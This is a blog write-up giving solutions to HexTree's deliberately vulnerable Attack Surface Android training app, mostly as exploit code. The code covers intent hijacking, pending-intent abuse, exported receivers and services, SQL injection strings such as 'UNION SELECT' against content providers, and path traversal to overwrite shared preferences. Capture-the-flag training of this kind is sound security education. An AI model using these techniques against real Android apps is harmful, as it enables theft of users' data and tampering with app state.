---
title: HexTree Attack Surface Android App Solutions 
author: Muhammad Adel
date: 2024-11-06 13:40:00 +0200
categories: [Android Security]
tags: [android security, writeups]
---

## **Introduction**

Peace be upon all of you. In this post I am going to share all the solutions for the Attack Surface Android app, which is part of the amazing Hextree Android Application Security course and also sponsored by Google. This app is packed with hands-on challenges to practice many real-world Android vulnerabilities.

Course Link: [https://app.hextree.io/map/android](https://app.hextree.io/map/android)

![image.png](/assets/HexTree/1.jpeg)

## **Intents**

### **Flag1**

> Basic exported activity

```bash
adb shell am start-activity -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```

### Flag2

> Intent with extras

```java
Intent exploitIntent = new Intent();
exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag3Activity");
exploitIntent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(exploitIntent);
```

### **Flag3**

> Intent with a data URI

```java
Intent exploitIntent = new Intent();
exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag3Activity");
exploitIntent.setAction("io.hextree.action.GIVE_FLAG");
exploitIntent.setData(Uri.parse("https://app.hextree.io/map/android"));
startActivity(exploitIntent);
```

### **Flag4**

> State Machine

```java
Intent exploitIntent3 = new Intent();
exploitIntent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
exploitIntent3.setAction("GET_FLAG_ACTION");
startActivity(exploitIntent3);

Intent exploitIntent2 = new Intent();
exploitIntent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
exploitIntent2.setAction("BUILD_ACTION");
startActivity(exploitIntent2);

Intent exploitIntent = new Intent();
exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
exploitIntent.setAction("PREPARE_ACTION");
startActivity(exploitIntent);
```

### **Flag5**

> Intent in intent

```java
// nextIntent -- Intent3
Intent exploitIntent3 = new Intent();
exploitIntent3.putExtra("reason", "back");

// Intent2
Intent exploitIntent2 = new Intent();
exploitIntent2.putExtra("return", 42);
exploitIntent2.putExtra("nextIntent", exploitIntent3);

// Main Intent -- Intent
Intent exploitIntent1 = new Intent();
exploitIntent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
exploitIntent1.putExtra("android.intent.extra.INTENT", exploitIntent2);
startActivity(exploitIntent1);
```

### **Flag6**

> Not Exported

```java
// nextIntent -- Intent3
Intent exploitIntent3 = new Intent();
exploitIntent3.putExtra("reason", "next");
exploitIntent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
exploitIntent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

// Intent2
Intent exploitIntent2 = new Intent();
exploitIntent2.putExtra("return", 42);
exploitIntent2.putExtra("nextIntent", exploitIntent3);

// Main Intent -- Intent
Intent exploitIntent1 = new Intent();
exploitIntent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
exploitIntent1.putExtra("android.intent.extra.INTENT", exploitIntent2);
startActivity(exploitIntent1);
```

### **Flag7**

> Activity Lifecycle tricks

```java
Intent OpenIntent = new Intent();
OpenIntent.setAction("OPEN");
OpenIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity");
startActivity(OpenIntent);

Handler handler = new Handler();
handler.postDelayed(() -> {
    // Send the "REOPEN" action to trigger onNewIntent
    Intent exploitIntent1 = new Intent();
    exploitIntent1.setAction("REOPEN");
    exploitIntent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity");
    exploitIntent1.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
    startActivity(exploitIntent1);
}, 2000);
```

### **Flag8**

> Do you expect a result?

```java
// Make sure your package Name contains "Hextree" 
exploitIntent1 = new Intent();
exploitIntent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity");
startActivityForResult(exploitIntent1, 0);
```

### **Flag9**

> Receive result with flag

```java
// Make sure your package Name contains "Hextree" 
protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);

  // Main Intent -- Intent
  Intent exploitIntent1 = new Intent();
  exploitIntent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag9Activity");
  startActivityForResult(exploitIntent1, 0);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  String result = data.getStringExtra("flag");
  Log.d("Flag9", result);
}
```

### **Flag10**

> Hijack implicit intent with the flag

```xml
<activity
    android:name=".SecondActivity"
    android:exported="true" >
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
</activity>
```

```java
Intent intent = getIntent();
if("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())){
    String flag = intent.getStringExtra("flag");
    Log.d("Flag10", flag);
}else{
    Log.d("Flag10", "Not Received");
}
```

### **Flag11**

> Respond to implicit intent

```xml
<activity
    android:name=".SecondActivity"
    android:exported="true" >
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
</activity>
```

```java
Intent intent = getIntent();
if("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())){
    setResult(42, intent.putExtra("token", 1094795585));
}else{
    Log.d("Flag11", "Not Received");
}
```

### **Flag12**

> Careful intent conditions

```xml
<activity
    android:name=".SecondActivity"
    android:exported="true" >
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
</activity>
```

Main Activity

```java
Intent intent2 = new Intent();
intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
intent2.putExtra("LOGIN", true);
startActivity(intent2);
```

SecondActvity

```java
Intent intent = getIntent();
if("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())){
    intent.putExtra("token", 1094795585);
    setResult(42, intent);
    finish();
    Log.d("Flag12", "Accessed");
}else{
		Log.d("Flag12", "Not Received");
}
```

### **Flag22**

> Receive Pending Intent

Main Activity

```java
Intent targetIntent = new Intent();
targetIntent.setClass(this,  SecondActivity.class);
PendingIntent pendingIntent = PendingIntent.getActivity(this,0,targetIntent, PendingIntent.FLAG_UPDATE_CURRENT);

Intent sendIntent = new Intent();
sendIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");
sendIntent.putExtra("PENDING", pendingIntent);
startActivity(sendIntent);
```

Second Activity

```java
Intent receivedIntent = getIntent();
if (receivedIntent != null) {
    String flag = receivedIntent.getStringExtra("flag");
    Log.d("Flag22", flag);
}else{
    Log.d("Flag22", "???");
}
```

### **Flag23**

> Hijack Pending Intent

```xml
<activity
  android:name=".SecondActivity"
  android:exported="true" >
<intent-filter>
  <action android:name="io.hextree.attacksurface.MUTATE_ME"/>
  <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
</activity>
```

```java
Intent receivedIntent = getIntent();
PendingIntent pendingIntent = receivedIntent.getParcelableExtra("pending_intent");
Intent newIntent = new Intent();
newIntent.setAction("io.hextree.attacksurface.GIVE_FLAG");
newIntent.putExtra("code", 42);

try {
    pendingIntent.send(this, 0, newIntent);
} catch (PendingIntent.CanceledException e) {
    e.printStackTrace();
}
```

# **DeepLinks**

### **Flag13**

> create a hex://open/ link

Via the link builder:

[https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=](https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World)

 `hex://flag?action=give-me`

### **Flag14**

> Hijack web login

```xml
<activity
android:name=".SecondActivity"
android:exported="true" >
<intent-filter>
  <action android:name="android.intent.action.VIEW"/>
  <category android:name="android.intent.category.DEFAULT"/>
  <category android:name="android.intent.category.BROWSABLE"/>
<data
    android:scheme="hex"
    android:host="token"/>
  </intent-filter>
</activity>
```

```java
Intent receivedIntent = getIntent();
if(receivedIntent.getAction() == "android.intent.action.VIEW"){
    Uri data = receivedIntent.getData();
    Log.d("queryParameters", String.valueOf(data));
    String authToken = data.getQueryParameter("authToken");
    String authChallenge = data.getQueryParameter("authChallenge");

    Intent sendIntent = new Intent();
    sendIntent.setAction("android.intent.action.VIEW");
    sendIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity");
    sendIntent.setData(Uri.parse("hex://token?authToken="+authToken+"&type=admin&authChallenge="+authChallenge));
    startActivity(sendIntent);
}
```

### **Flag15**

> Create a intent://flag15 / link

Via the link builder:

[https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=](https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World)

```java
intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;S.action=flag;S.open=flag;B.flag=true;end;
```

# **Broadcast Receivers**

### **Flag16**

> Basic Exposed Receiver

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
intent.putExtra("flag","give-flag-16");
sendBroadcast(intent);
```

### **Flag17**

> Receiver with Response

```java
Intent intent = new Intent();
intent.putExtra("flag","give-flag-17");
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
sendOrderedBroadcast(intent, null);
```

### **Flag18**

> Hijack Broadcast Intent

```java
BroadcastReceiver receiver = new BroadcastReceiver() {
@Override
// Once a broadcast received with a specific intent
public void onReceive(Context context, Intent intent) {
    setResultCode(1);
    setResultData("Heey");
}
};
// Waiting for any broadcast with this intent "io.hextree.broadcast.FREE_FLAG"
registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
```

## **Widgets**

### **Flag19**

> Widget System intents

```java
Intent intent = new Intent();
intent.setAction("APPWIDGET_UPDATE");
Bundle bundle = new Bundle();
bundle.putInt("appWidgetMaxHeight", 1094795585);
bundle.putInt("appWidgetMinHeight", 322376503);
intent.putExtra("appWidgetOptions", bundle);
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
sendBroadcast(intent);
```

## **Notifications**

### **Flag20**

> Notification Button Intents

```java
Intent intent = new Intent();
intent.setAction("io.hextree.broadcast.GET_FLAG");
intent.putExtra("give-flag", true);
sendBroadcast(intent);
```

### **Flag21**

> Hijack Notification Button

```java
BroadcastReceiver receiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        String flag = intent.getStringExtra("flag");
        Log.d("flag21", flag);
    }
};
registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.GIVE_FLAG"));
}
```

## **Services**

### **Flag24**

> Basic Service Start

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
startService(intent);
```

### **Flag25**

> Service Lifecycle

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
// Change a lock number each time
intent.setAction("io.hextree.services.UNLOCK1");
startService(intent);
```

## **Message Handler**

### **Flag26**

> Basic Message Handler

```java
public class MainActivity extends AppCompatActivity {

private boolean isBound = false;
private ServiceConnection connection = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        Messenger serviceMessenger = new Messenger(service);
        isBound = true;

        // Method to send messages to the service
        Message msg = Message.obtain(null, 42);
        try{
            serviceMessenger.send(msg);
        }
        catch (RemoteException e){
            throw new RuntimeException(e);
        }
    }
    @Override
    public void onServiceDisconnected(ComponentName name) {
    }
};
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // Bind to the service
    Intent intent = new Intent();
    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
    bindService(intent, connection, Context.BIND_AUTO_CREATE);
}
}
```

### **Flag27**

> Message Replies

```java
public class MainActivity extends AppCompatActivity {
private boolean isBound = false;
private final Messenger clientMessegener = new Messenger(new IncomingHandler());
private Messenger serviceMessenger = null;
private String obtainedPassword;

private class IncomingHandler extends Handler{
IncomingHandler() {super(Looper.getMainLooper());}

  @Override
  public void handleMessage(Message msg){
      Bundle reply =  msg.getData();
      obtainedPassword = reply.getString("password");
      if(reply != null && obtainedPassword != null) {
          Log.i("MessageReply1234", reply.toString());
          Log.d("MessageReply1234", "Obtained password: " + obtainedPassword);
          
          **getFlag(obtainedPassword);**
      }
      else{
          Log.i("Message1234", "NO Reply");
      }

  }
}
private ServiceConnection connection = new ServiceConnection() {
  @Override
  public void onServiceConnected(ComponentName name, IBinder binder) {
      serviceMessenger = new Messenger(binder);
      isBound = true;
      **// Start by getting the secret
      requestPassword();**
  }
  @Override
  public void onServiceDisconnected(ComponentName name) {
  }
};

// Method to request the password
private void requestPassword() {
    if (!isBound) return;
    Message msg = Message.obtain(null, 2);
    msg.obj = new Bundle();
    msg.replyTo = clientMessegener;
    try {
        serviceMessenger.send(msg);
    } catch (RemoteException e) {
        e.printStackTrace();
    }
}
// Method to request the flag
private void getFlag(String Password) {
    **// First, send "give flag" echo**
    Message msg = Message.obtain(null, 1);
    Bundle bundle = new Bundle();
    bundle.putString("echo", "give flag");
    msg.setData(bundle);
    msg.replyTo = clientMessegener;
    try {
        serviceMessenger.send(msg);
    } catch (RemoteException e) {
        e.printStackTrace();
    }

    **// Now, send the retrevied password with int = 3 to get flag**
    msg = Message.obtain(null, 3);
    bundle = new Bundle();
    bundle.putString("password", Password);
    msg.setData(bundle);
    msg.replyTo = clientMessegener;
    try {
        serviceMessenger.send(msg);
    } catch (RemoteException e) {
        e.printStackTrace();
    }
}
@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

// Bind to the service
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
bindService(intent, connection, Context.BIND_AUTO_CREATE);
}
}
```

## **AIDL Service**

### **Flag28**

> Basic AIDL Service

Aidl Interface Code

```java
// IFlag28Interface.aidl
package io.hextree.attacksurface.services;

// Declare any non-default types here with import statements
interface IFlag28Interface {
    boolean openFlag();
}
```

MainActivity Code

```java
public class MainActivity extends AppCompatActivity {
    private boolean isBound = false;
    private Messenger serviceMessenger = null;

    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            serviceMessenger = new Messenger(binder);
            isBound = true;
            IFlag28Interface aidlService = IFlag28Interface.Stub.asInterface(binder);
            try {
                aidlService.openFlag();
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Bind to the service
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
}
```

### **Flag29**

> AIDL Service

Aidl Interface Code

```java
// IFlag28Interface.aidl
package io.hextree.attacksurface.services;

// Declare any non-default types here with import statements
interface IFlag29Interface {
    String init();
    void authenticate(String str);
    void success();
}
```

MainActivity Code

```java
public class MainActivity extends AppCompatActivity {
    private boolean isBound = false;
    private Messenger serviceMessenger = null;

    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            serviceMessenger = new Messenger(binder);
            isBound = true;
            IFlag29Interface aidlService = IFlag29Interface.Stub.asInterface(binder);
            try {
                String password = aidlService.init();
                aidlService.authenticate(password);
                aidlService.success();
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Bind to the service
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
}
```

## **Content Provider**

### **Flag30**

> Content Provider Query

```java
ContentResolver resolver = getContentResolver();
Uri uri = Uri.parse("content://io.hextree.flag30/success");
Cursor cursor = resolver.query(uri, null, null, null, null);

if (cursor != null) {
  // Retrieves all column names
  String[] columnNames = cursor.getColumnNames();
  while (cursor.moveToNext()) {
      for (String columnName : columnNames) {
          String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
          Log.i("ColumnData", columnName + ": " + value);
      }
  }
  cursor.close();
}
```

### **Flag31**

> Provider URI Matching

```java
ContentResolver resolver = getContentResolver();
Uri uri = Uri.parse("content://io.hextree.flag31/flag/31");

Cursor cursor = resolver.query(uri, null, null, null, null);

if (cursor != null) {
    // Retrieves all column names
    String[] columnNames = cursor.getColumnNames();
    while (cursor.moveToNext()) {
        for (String columnName : columnNames) {
            String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
            Log.i("Flag31", columnName + ": " + value);
        }
    }
    cursor.close();
}
```

### **Flag32**

> Injection in Content Provider

```java
ContentResolver resolver = getContentResolver();
Uri uri = Uri.parse("content://io.hextree.flag32/flags");

// Full Query looks like:
// SELECT * FROM Flag WHERE visible=1 AND (1) UNION SELECT * FROM Flag WHERE visible=0 AND (1);
Cursor cursor = resolver.query(uri, null, **"1) UNION SELECT * FROM Flag WHERE visible=0 AND (1"**, null, null);

if (cursor != null) {
    // Retrieves all column names
    String[] columnNames = cursor.getColumnNames();
    while (cursor.moveToNext()) {
        for (String columnName : columnNames) {
            String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
            Log.i("QueryFlag32", columnName + ": " + value);
        }
    }
    cursor.close();
}
```

### **Flag33.1**

> Return Provider Access

```java
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

Intent intent = new Intent();
intent.setAction("io.hextree.FLAG33");
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag33Activity1");
startActivityForResult(intent, 1);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
super.onActivityResult(requestCode, resultCode, data);

ContentResolver resolver = getContentResolver();
// injecting the selection field which is WHERE clause: SELECT * FROM Flag WHERE _id=2 UNION SELECT 1,title,content,'a' FROM Note
Cursor cursor = resolver.query(data.getData(), null, **"_id=2 UNION SELECT 1,title,content,'a' FROM Note"**, null, null);

if (cursor != null) {
    String[] columnNames = cursor.getColumnNames();
    while (cursor.moveToNext()) {
        for (String columnName : columnNames) {
            String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
            Log.i("QueryFlag33.1", columnName + ": " + value);
        }
    }
    cursor.close();
	}
}
```

### **Flag33.2**

> Implict Provider Access

Creating an exported activity to hijack the intent permissions to access the provider.

```xml
<activity
android:name=".SecondActivity"
android:exported="true">
<intent-filter>
<action android:name="io.hextree.FLAG33" />
<category android:name="android.intent.category.DEFAULT" />
<data
    android:scheme="content"
    android:host="io.hextree.flag33_2"
    android:path="/flags"/>
</intent-filter>
</activity>
```

```java
Intent intent = getIntent();

if (intent.getAction() != null){
Log.i("QueryFlag33.2", intent.getAction());
ContentResolver resolver = getContentResolver();
Cursor cursor = resolver.query(intent.getData(), null, "_id=2 UNION SELECT 1,title,content,'a' FROM Note", null, null);

if (cursor != null) {
    String[] columnNames = cursor.getColumnNames();
    while (cursor.moveToNext()) {
        for (String columnName : columnNames) {
            String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
            Log.i("QueryFlag33.2", columnName + ": " + value);
        }
    }
    cursor.close();
}
}
```

## **File Provider**

### **Flag34**

> Simple File Provider

```java
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

Intent intent = new Intent();
intent.putExtra("filename", "flags/flag34.txt");
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag34Activity");
startActivityForResult(intent, 42);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
super.onActivityResult(requestCode, resultCode, data);
Log.i("QueryFlag34", String.valueOf(data.getData()));
try {
    InputStream inputStream = getContentResolver().openInputStream(data.getData());
    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
    String line;

    while ((line = reader.readLine()) != null) {
        Log.i("QueryFlagFile34", line);
    }
}
catch (IOException e){
}
}
```

### **Flag35**

> Root-File Provider

```java
String stringExtra = getIntent().getStringExtra("filename");
if (stringExtra != null) {
prepareFlag(this, stringExtra);
Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.root", new File(getFilesDir(), stringExtra));
Intent intent = new Intent();
intent.setData(uriForFile);
intent.addFlags(3);
**setResult(0, intent);**
return;
}
// Returns the absolute path to the directory on the filesystem where files created
Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), "secret.txt"));
Intent intent2 = new Intent();
intent2.setData(uriForFile2);
intent2.addFlags(3);
**setResult(-1, intent2);**
}
```

### **Flag36**

> Overwriting Shared Prefs

```java
public class MainActivity extends AppCompatActivity {

@Override
protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);

  Intent intent = new Intent();
  **intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");**
  intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
  startActivityForResult(intent, 42);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  Log.i("QueryFlag36", String.valueOf(data.getData()));
  try {
      // Read the existing XML file
      InputStream inputStream = getContentResolver().openInputStream(data.getData());
      StringBuilder stringBuilder = new StringBuilder();
      BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
      String line;

      **while ((line = reader.readLine()) != null) {
          // Replace false with true
          line = line.replaceAll("false", "true");
          stringBuilder.append(line).append("\n");
      }
      reader.close();

      // Write the modified content back to the file
      OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
      outputStream.write(stringBuilder.toString().getBytes());
      outputStream.close();**
	  // restart the app to take effect
      Intent openFlag36Activity = new Intent();
      openFlag36Activity.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag36Activity");
      startActivity(openFlag36Activity);
  }
  catch (IOException e){
  }
}}
```

### **Flag37**

> File Provider Receivers

MainActiivty

```java
Intent intent = new Intent();
Uri FileProvider = Uri.parse("content://ItsFadinG.github.io");
intent.setData(FileProvider);
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag37Activity");
startActivity(intent);
```

Provider XML 

```xml
<provider
android:name=".AttackProvider"
android:authorities="ItsFadinG.github.io"
android:enabled="true"
android:exported="true">
</provider>
```

Attack Provider Code

```java
public class AttackProvider extends ContentProvider {
public AttackProvider() {
}

@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
  Log.i("AttackProvider", "query("+uri.toString()+")");

  MatrixCursor cursor = new MatrixCursor(new String[]{
          OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
  });

  cursor.addRow(new Object[]{
          "../flag37.txt", 1337
  });

  return cursor;
}
@Override
public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
  Log.i("AttackProvider", "openFile(" + uri.toString() + ")");

  try {
      ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
      ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

      new Thread(() -> {
          try {
              outputStream.write("give flag".getBytes());
              outputStream.close();
          } catch (IOException e) {
              Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e);
          }
      }).start();

      return pipe[0];
  } catch (IOException e) {
      throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
  }
}

@Override
public int delete(Uri uri, String selection, String[] selectionArgs) {
    Log.i("AttackProvider", "delete("+uri.toString()+")");
    throw new UnsupportedOperationException("Not yet implemented");
}

@Override
public String getType(Uri uri) {
    Log.i("AttackProvider", "getType("+uri.toString()+")");
    throw new UnsupportedOperationException("Not yet implemented");
}

@Override
public Uri insert(Uri uri, ContentValues values) {
    Log.i("AttackProvider", "insert("+uri.toString()+")");
    throw new UnsupportedOperationException("Not yet implemented");
}

@Override
public boolean onCreate() {
    Log.i("AttackProvider", "onCreate()");
    return true;
}

@Override
public int update(Uri uri, ContentValues values, String selection,
                  String[] selectionArgs) {
    Log.i("AttackProvider", "update("+uri.toString()+")");
    throw new UnsupportedOperationException("Not yet implemented");
}
}
```

## **Conclusion**
I will be happy to hear your thoughts and feedback. Also, let me know if you need a detailed explanation for any of these challenges. PEACE!